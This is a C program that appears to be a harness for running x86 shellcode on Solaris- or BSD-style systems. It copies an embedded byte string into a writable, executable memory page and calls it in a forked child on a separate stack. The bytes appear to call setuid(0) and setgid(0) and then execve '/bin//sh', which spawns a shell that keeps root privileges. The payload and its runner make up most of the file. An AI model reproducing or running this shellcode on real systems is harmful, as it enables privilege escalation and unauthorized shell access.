#include <stdio.h>
#include <string.h>

#if (defined __sun || defined __FreeBSD__)
#include <strings.h>
#endif

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <unistd.h>

#include "regs/state.h"

#ifndef unused
#define unused(x) ((void)(x))
#endif

#ifndef SHADOW_STACK_SIZE
#define SHADOW_STACK_SIZE (1024 * 8)
#endif

int main(int argc, char **argv) {
  unused(argc);
  unused(argv);

  int ret, wstatus;
  pid_t pid;
  struct utsname uts;
  char *pcall;
  char *shadow_stack;
  char *shellcode = "\x33\xf6\x56\x56\x33\xc0\xb0\x17"
                    "\x50\xcd\x91\x56\x56\x33\xc0\xb0"
                    "\x2e\x50\xcd\x91\x56\x68\x6e\x2f"
                    "\x73\x68\x68\x2f\x2f\x62\x69\x8b"
                    "\xdc\x56\x53\x8b\xcc\x56\x56\x51"
                    "\x53\x33\xc0\xb0\x3b\x50\xcd\x91";

  pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_WRITE | PROT_EXEC,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (pcall == MAP_FAILED) {
    perror("mmap()");
    ret = -1;
    goto __fallback;
  }

  shadow_stack = mmap(NULL, SHADOW_STACK_SIZE, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  if (shadow_stack == MAP_FAILED) {
    perror("mmap()");
    ret = -1;
    goto __must_unmap_payload;
  }

  bzero(&uts, sizeof(struct utsname));

  if ((ret = uname(&uts)) < 0) {
    perror("uname()");
    goto __must_unmap_shadow_stack;
  }

  printf("[*] Machine info\n");
  printf(" [*] sys: %s\n", uts.sysname);
  printf(" [*] node: %s\n", uts.nodename);
  printf(" [*] release: %s\n", uts.release);
  printf(" [*] version: %s\n", uts.version);
  printf(" [*] machine: %s\n", uts.machine);

  printf("[*] Copying shellcode into crafted buffer.\n");
  memcpy(pcall, shellcode, strlen(shellcode));

  printf("[*] Saving register state..\n");
  save_regs(&__serialize_regs(cregs));

  printf("[*] Creating trivial sandbox..\n");

  pid = fork();

  if (pid < 0) {
    perror("fork()");
    ret = pid;
    goto __must_unmap_shadow_stack;
  }

  if (!pid) {
    printf("[*] Creating shadow stack..\n");
    __asm__ __volatile__("movl %0, %%esp\n"
                         "movl %0, %%ebp\n"
                         :
                         : "r"((unsigned long)shadow_stack));

    printf("[*] Executing the shellcode..\n");
    __asm__ __volatile__("call *%%eax\r\n" : : "a"(pcall));
  } else {
    waitpid(-1, &wstatus, 0);
  }

  printf("[*] Restoring register state..\n");
  store_regs(&__serialize_regs(cregs));

  printf("[*] Cleaning up..\n");
  munmap(shadow_stack, SHADOW_STACK_SIZE);
  munmap(pcall, sysconf(_SC_PAGESIZE));

  return 0;

__must_unmap_shadow_stack:
  munmap(shadow_stack, sysconf(_SC_PAGESIZE));

__must_unmap_payload:
  munmap(pcall, sysconf(_SC_PAGESIZE));

__fallback:
  return ret;
}
